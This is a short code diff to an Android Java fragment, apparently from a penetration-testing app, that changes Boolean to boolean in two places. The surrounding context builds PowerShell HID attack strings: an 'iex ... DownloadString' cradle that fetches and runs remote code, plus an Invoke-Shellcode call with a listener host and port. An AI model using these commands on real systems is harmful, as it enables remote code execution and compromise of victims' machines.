@@ -353,7 +353,7 @@ public class HidFragment extends Fragment {
                 String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
                 String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
-                Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
                 if (!isSaved) {
                     NhPaths.showMessage(context, "Source not updated (configFileUrlPath)");
                 }
@@ -582,7 +582,7 @@ public class HidFragment extends Fragment {
                 EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
                 String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
 
-                Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
                 if (!isSaved) {
                     NhPaths.showMessage(context, "Source not updated (configFileUrlPath)");
                 }
